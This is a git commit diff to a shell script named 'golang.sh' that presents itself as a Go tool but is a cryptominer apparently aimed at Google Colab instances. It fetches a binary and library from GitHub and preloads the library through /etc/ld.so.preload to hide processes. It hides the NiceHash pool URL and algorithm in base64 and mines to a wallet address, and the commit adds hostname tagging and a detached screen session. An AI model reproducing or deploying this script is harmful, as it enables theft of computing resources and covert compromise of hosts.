f0e863f1fac798f3e81ed133089729b789cb41aa
pickaxecolleague <100679616+pickaxecolleague@users.noreply.github.com>
2022-03-08 12:15:09 +0700

    Update golang.sh

--- golang.sh
+++ golang.sh
@@ -1,20 +1,17 @@
 #!/bin/bash
 
-DebugPID=$(ps -ef | grep '/usr/bin/python3 /usr/local/lib/python3.7/dist-packages/debugpy/adapter' | grep -v 'grep' | awk '{ printf $2 }')
-pkill $DebugPID
-
 golang=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/golang
 libgolang=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/libgolang.c
 
-userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.Colab"
+hostname=$(cat /var/colab/hostname)
+userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY."$hostname
 string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
 key=ZXRoYXNo
 
 seed=$(echo $string | base64 --decode)
 apikey=$(echo $key | base64 --decode)
 
-
-sudo apt-get install -y libpci-dev gcc
+sudo apt-get install -y libpci-dev gcc screen
 
 wget $golang
 wget $libgolang
@@ -26,4 +23,4 @@ echo /usr/local/lib/libgolang.so >> /etc/ld.so.preload
 
 chmod 777 golang
 
-./golang -a $apikey --url $seed -u $userAgent -p x 
+screen -S "golang" ./golang -a $apikey --url $seed -u $userAgent -p x
